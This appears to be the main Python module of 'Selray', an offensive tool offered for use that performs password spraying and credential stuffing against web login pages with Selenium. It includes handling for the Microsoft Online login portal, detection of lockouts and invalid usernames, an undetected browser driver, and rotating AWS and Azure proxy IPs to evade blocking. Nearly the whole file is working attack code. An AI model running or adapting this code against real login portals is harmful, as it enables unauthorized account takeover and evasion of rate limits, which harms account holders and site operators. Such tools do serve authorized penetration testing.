import sys
from . import aws
import argparse
from datetime import datetime, timedelta
import pause
from time import sleep
from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from multiprocessing import Process
import os
import toml
from seleniumbase import Driver
import importlib.resources
from . import azure_proxy


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def parse_arguments():
    parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
    required = parser.add_argument_group("Required")
    condition = parser.add_argument_group("Condition for Successful Login (One Required)")
    optional = parser.add_argument_group("Optional")
    aws_group = parser.add_argument_group("AWS Proxy Options")
    azure_group = parser.add_argument_group("Azure Proxy Options")
    proxy_group = parser.add_argument_group("Global Proxy Options")

    required.add_argument('--url',
                          help="(REQUIRED) URL of the website to spray.")
    required.add_argument("-u", "--usernames",
                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, can be a"
                               "list of colon-seperated credentials to spray (e.g. USER:PASS)")
    required.add_argument("-p", "--passwords",
                          help="(REQUIRED) Password or file with list of usernames to spray.")
    required.add_argument('-uf', '--username-field', type=str,
                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                               "a username into. Can be found by inspecting the username field in your browser. For"
                               "example, if '<input type='email'>', enter 'type='email''")
    required.add_argument('-pf', '--password-field', type=str,
                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                               "a username into. Can be found by inspecting the username field in your browser. For"
                               "example, if '<input type='email'>', enter 'type='email''")

    condition.add_argument('-f', '--fail',
                           help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
                                "an alternative.")
    condition.add_argument('-s', '--success',
                           help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
                                "used as an alternative")

    optional.add_argument("-m", "--mode", help="Use a pre-built mode, eliminating the need for -uf,-pf,-f,-s, and -i. Mode name should correspond to the file name (minus extension) of a profile in the modes folder.")
    optional.add_argument('-t', '--threads', type=int,
                          help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
                               "Default is 5.")
    optional.add_argument('-dl', '--delay', type=int, default=30,
                          help="(OPTIONAL) Length of time between passwords. The delay is between the first spray "
                               "attempt with a password and the first attempt with the next password. Default is 30.")
    optional.add_argument("-d", "--domain",
                          help="(OPTIONAL) Prefix all usernames with a domain (e.g. DOMAIN\\USERNAME)")
    optional.add_argument("-da", "--domain-after", action="store_true",
                          help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain)")
    optional.add_argument("-i", "--invalid-username", type=str,
                          help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
                               "strings can be provided comma seperated with no spaces.")
    optional.add_argument('-l', '--lockout', type=str,
                         help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
                              "strings can be provided comma seperated with no spaces.")
    optional.add_argument('-cb', '--checkbox', type=str,
                          help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
                               "allowing the script to automatically check it. For example, if "
                               "'<input type='checkbox'>', enter 'type='checkbox''")

    optional.add_argument('--update', action='store_true',
                          help="(OPTIONAL) Update the script to the latest version (Only works if installed with PIPX).")

    proxy_group.add_argument('--proxies', type=str,
                          help="(OPTIONAL) Proxy URLs to proxy traffic through. Can be a file name (CSV or TXT) or a "
                               "comma-separated list of proxies. If AWS or Azure proxies are also configured, both "
                               "manually-specified and automatic proxies will be used.")
    proxy_group.add_argument('--proxy-clean', action='store_true', help="(OPTIONAL) Clean up all created proxies, instead of spraying.")
    proxy_group.add_argument('--proxy-list', action='store_true', help="(OPTIONAL) List all created proxies.")
    proxy_group.add_argument('-n','--num_sprays_per_ip', type=int, help="(OPTIONAL) Number of sprays to perform per IP address. Default is 5.")

    azure_group.add_argument('--azure', action='store_true', help="(OPTIONAL) Use Azure proxies. Default is False.")

    aws_group.add_argument('--aws', action='store_true', help="(OPTIONAL) Use AWS proxies. Default is False.")
    aws_group.add_argument("--aws-access-key", help="AWS Access Key ID")
    aws_group.add_argument("--aws-secret-key", help="AWS Secret Access Key")
    aws_group.add_argument("--aws-session-token", help="AWS Session Token (optional)")
    aws_group.add_argument("--aws-region", default="us-east-2", help="AWS Region")

    return parser.parse_args()


def load_mode_config(args, mode_dir='selray/modes'):
    """
    Loads mode configuration from a TOML file into the args namespace if not already specified.
    """
    try:
        with importlib.resources.files("selray.modes").joinpath(f"{args.mode.lower()}.toml").open("r") as f:
            config = toml.load(f)
    except FileNotFoundError:
        config_path = os.path.join(mode_dir, f"{args.mode.lower()}.toml")
        with open(config_path, 'r', encoding='utf-8') as f:
            config = toml.load(f)

    for key, value in config.items():
        if not getattr(args, key, None):
            setattr(args, key, value)


def prepare_fields(username_field="", password_field="", checkbox=""):
    username_field = username_field.replace("'", "").replace('"', "")  # Remove quotation marks
    password_field = password_field.replace("'", "").replace('"', "")  # Remove quotation marks

    username_field = username_field.split("=")
    username_field_key = username_field[0]
    username_field_value = username_field[1]

    password_field = password_field.split("=")
    password_field_key = password_field[0]
    password_field_value = password_field[1]

    if checkbox:
        checkbox = checkbox.replace("'", "").replace('"', "")  # Remove quotation marks
        checkbox = checkbox.split("=")
        checkbox_key = checkbox[0]
        checkbox_value = checkbox[1]
    else:
        checkbox_key, checkbox_value = "", ""

    return (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
            checkbox_value)


def list_in_string(string_to_check="", list_to_compare=None):
    if not list_to_compare:
        return False
    for comparison_string in list_to_compare:
        if comparison_string in string_to_check:
            return True
    return False


def prepare_invalid_username(invalid_username=None):
    final_list = ["couldn't find an account with that username", "this username may be incorrect"]
    if invalid_username:
        invalid_username = invalid_username.split(",")
        final_list.extend(invalid_username)
    return final_list


def prepare_lockout(lockout_messages=None):
    final_list = ["account has been locked out", "too many login attempts"]
    if lockout_messages:
        invalid_username = lockout_messages.split(",")
        final_list.extend(invalid_username)
    return final_list


def prepare_url(url=""):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"  # TODO Check URL and allow http://, if that's all that's supported.

    return url


def prepare_usernames(usernames=None, domain="", domain_after=False):
    if not domain:
        return usernames

    i = 0
    while i < len(usernames):
        if "/" in usernames[i] or "@" in usernames[i]:  # If the domain is already in the username, ignore the domain
            i += 1
            continue

        if domain_after:
            usernames[i] = f"{usernames[i]}@{domain}"
        else:
            usernames[i] = f"{domain}/{usernames[i]}"

        i += 1

    return usernames


def print_ending(results):
    print(f"\nPassword spraying completed at {datetime.now().strftime('%m/%d/%Y %H:%M')}")

    success_count = sum(1 for entry in results if entry and entry.get('RESULT') == 'SUCCESS')
    if success_count:
        print(f"Valid Credentials Found: {success_count}")
        for credential in results:
            if credential and credential.get('RESULT') == 'SUCCESS':
                print(f"{credential['USERNAME']} - {credential['PASSWORD']}")


def import_txt_file(filename):
    data = []
    with open(filename, "r") as file:
        for line in file:
            data.append(line.rstrip())
    return data


def process_file(filename):
    if filename.endswith(".txt"):
        return import_txt_file(filename)
    elif filename.endswith(".csv"):
        print("ERROR - CSVs are currently not supported.")
        sys.exit()
    else:
        return [filename]  # If it isn't a file, just return the value


def prepare_success_fail(success="", fail=""):
    if not success and not fail:
        print(f"{Colors.FAIL}ERROR - No success or failure condition provided with -s or -f. Only one needs to be "
              f"provided, but one does need to be provided.{Colors.END}")
        sys.exit()
    elif success:
        success = success.split(",")
        fail = []
    elif fail:
        fail = fail.split(",")
        success = []

    return fail, success


def prepare_proxies(ec2, args):
    proxies = []
    if args.proxies:
        manual_proxies = process_file(args.proxies)
        if not manual_proxies:
            manual_proxies = args.proxies.split(",")

        for manual_proxy in manual_proxies:
            proxies.append({"type": "MANUAL", "ip": "", "id": None, "url": manual_proxy})

    threads_needed = args.threads
    threads_needed -= len(proxies)

    if args.azure:
        if threads_needed >= 6:
            azure_threads = 3
        elif args.aws:
            azure_threads = int(threads_needed / 2)
        else:
            azure_threads = threads_needed
        threads_needed -= azure_threads
        proxies.extend(azure_proxy.create_proxies(azure_threads))

    if args.aws:
         proxies.extend(aws.proxy_setup(ec2, threads_needed))

    if not proxies:
        proxies = [{"type": None, "ip": None, "id": None, "url": None} for _ in range(args.threads)]

    return proxies  # Proxies will always be a list of dicts.


def destroy_proxies(args, ec2):
    if ec2:
        aws.terminate_instances_in_security_group(ec2, "Selray")
    if args.azure:
        azure_proxy.delete_proxies()


def list_proxies(args, ec2):
    if ec2:
        aws.list_instances(ec2, "Selray")
    azure_proxy.list_proxies()



def print_beginning(args, version=None):
    # Calculate the length of the spray
    total_minutes = len(args.passwords) * args.delay
    days = total_minutes // (24 * 60)
    hours = (total_minutes % (24 * 60)) // 60
    minutes = total_minutes % 60
    if days == 0:
        spray_duration = "{:02d}:{:02d}".format(hours, minutes)
    else:
        spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)

    print(f"{Colors.HEADER}{Colors.BOLD}Selenium Spray{Colors.END}")
    print(f"Author:  Luke Lauterbach (Sentinel Technologies)")
    print(f"Version: {version}\n")

    print(f"{'Username Count:':<28}{len(args.usernames)}")
    print(f"{'Password Count:':<28}{len(args.passwords)}")
    print(f"{'Total Login Attempts:':<28}{(len(args.usernames) * len(args.passwords))}")
    print(f"{'Approximate Spray Duration:':<28}{spray_duration}")
    print(f"{'URL:':<28}{args.url}")
    if args.domain and args.domain_after:
        print(f"{'Domain:':<28}@{args.domain}")
    elif args.domain and not args.domain_after:
        print(f"{'Domain:':<28}{args.domain}/")
    print(f"{'Username Field:':<28}{args.username_field}")
    print(f"{'Password Field:':<28}{args.password_field}")
    if args.success:
        print(f"{'Success Condition:':<28}{args.success}")
    elif args.fail:
        print(f"{'Failure Condition:':<28}{args.fail}")
    print(f"{'Invalid Username Condition:':<28}{args.invalid_username}")
    print(f"{'Lockout Condition:':<28}{args.lockout}")
    print(f"{'Threads:':<28}{args.threads}")
    print(f"{'Delay:':<28}{args.delay}\n")


def perform_spray(spray_config, credentials, proxy, queue):
    ec2 = aws.get_ec2_session(spray_config.aws_region, spray_config.aws_access_key, spray_config.aws_secret_key,
                              spray_config.aws_session_token)
    results = []
    spray_num_with_current_ip = 0
    if proxy['type'] == 'AWS':
        proxy['ip'] = aws.start_ec2_instance(ec2, proxy['id'])

    for credential in credentials:
        spray_config.username = credential['USERNAME']
        spray_config.password = credential['PASSWORD']
        if spray_num_with_current_ip >= spray_config.num_sprays_per_ip and proxy['type'] == 'AWS':
            proxy['ip'] = aws.refresh_instance_ip(ec2, proxy['id'])
            spray_num_with_current_ip = 0
        result = attempt_login(spray_config, proxy['url'])
        results.append(result)
        spray_num_with_current_ip += 1

    if proxy['type'] == 'AWS':
        aws.stop_ec2_instance(ec2, proxy['id'])

    queue.put(results)


def attempt_login(spray_config, proxy_url):
    # SeleniumBase with Undetected Chromedriver is a better solution, but doesn't work with multiprocessing out of the
    #   box. Research needs to be done to properly support multiprocessing. For now, Undetected Chromedriver is used if
    #   threads is set to 1.
    if spray_config.threads == 1:
        selenium_options = ['--ignore-certificate-errors', '--ignore-ssl-errors']
        if proxy_url:
            selenium_options.append(f'--proxy-server={proxy_url}')
        # Initialize the Selenium browser
        driver = Driver(uc=True,
                        headless=False,
                        chromium_arg=selenium_options)
    else:
        selenium_options = webdriver.ChromeOptions()
        selenium_options.add_argument('--ignore-certificate-errors')
        # selenium_options.add_argument("--headless")
        if proxy_url:
            selenium_options.add_argument(f'--proxy-server={proxy_url}')
        driver = webdriver.Chrome(options=selenium_options)

    driver.set_page_load_timeout(30)
    driver.delete_all_cookies()
    driver.get(spray_config.url)

    # Wait until the username box loads
    try:
        WebDriverWait(driver, 5).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")))
    except:
        print(f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value "
              f"{spray_config.username_field_value}")
        driver.close()
        return

    # Find the username box
    input_box = driver.find_element(By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")
    input_box.clear()  # Clear any existing text in the input box
    input_box.send_keys(spray_config.username)

    # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
    # field to load.
    try:
        WebDriverWait(driver, 1).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
    except TimeoutException:
        input_box.send_keys(Keys.RETURN)
        sleep(1)  # Wait for the page to load

        # Specific to the Microsoft Online login portal
        if "Microsoft" and "Work or school account" in driver.page_source:
            work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
            work_box.click()
            sleep(1)

    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
        driver.close()
        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "INVALID USERNAME"}
    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
        driver.close()
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}

    try:
        WebDriverWait(driver, 3).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
    except:
        print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
              f"'{spray_config.password_field_value}'")
        driver.close()
        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}

    password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
    password_box.clear()
    password_box.send_keys(spray_config.password)
    # If there's a checkbox, click it.
    if spray_config.checkbox_key and spray_config.checkbox_value:
        try:
            checkbox = driver.find_element(By.XPATH, f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']")
            checkbox.click()
        except:
            print(f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value "
                  f"{spray_config.password_field_value}")

    password_box.send_keys(Keys.RETURN)

    # Check to see if the login was successful
    sleep(2)
    result = False
    for conditional_statement in (spray_config.fail + spray_config.success):
        if conditional_statement in driver.page_source:
            result = True

    if result and spray_config.success:
        result = "SUCCESS"
    elif not result and spray_config.fail:
        result = "SUCCESS"
    elif result and spray_config.fail:
        result = "INVALID"
    elif not result and spray_config.success:
        result = "INVALID"

    driver.quit()

    if result == "SUCCESS":
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {spray_config.username} - "
              f"{spray_config.password}")
    else:
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {spray_config.username} - {spray_config.password}")

    return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': result}


def credential_stuffing(spray_config, args, proxies):
    credentials = []
    for credential in args.usernames:
        username = credential.split(":")[0]
        password = credential.split(":")[1]
        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})

    # Assign unique spray identifier
    from collections import defaultdict
    user_groups = defaultdict(list)
    for d in credentials:
        user_groups[d['USERNAME']].append(d)
    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
        for index, d in enumerate(group, start=1):
            d['ATTEMPT'] = index
    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list

    stuffing_attempt = 1
    num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
    while stuffing_attempt <= num_stuffing_attempts:
        next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
        print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")

        credentials_to_spray = []
        for credential in credentials:
            if credential['ATTEMPT'] == stuffing_attempt:
                credentials_to_spray.append(credential)

        chunk_size = (len(credentials_to_spray) + len(proxies) - 1) // len(proxies)
        user_chunks = [credentials_to_spray[i:i + chunk_size] for i in
                       range(0, len(credentials_to_spray), chunk_size)]

        processes = []
        for proxy, user_chunk in zip(proxies, user_chunks):
            p = Process(target=perform_spray, args=(spray_config, user_chunk, proxy))
            p.start()
            processes.append(p)

        for p in processes:
            p.join()

        # Check to see if the process is at the end. If not, wait the specified time.
        if stuffing_attempt < num_stuffing_attempts:
            print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next stuffing attempt.")
            pause.until(next_start_time)
        else:
            print(
                f"Spray of password {stuffing_attempt} of {num_stuffing_attempts} complete. All passwords complete.")
        stuffing_attempt += 1
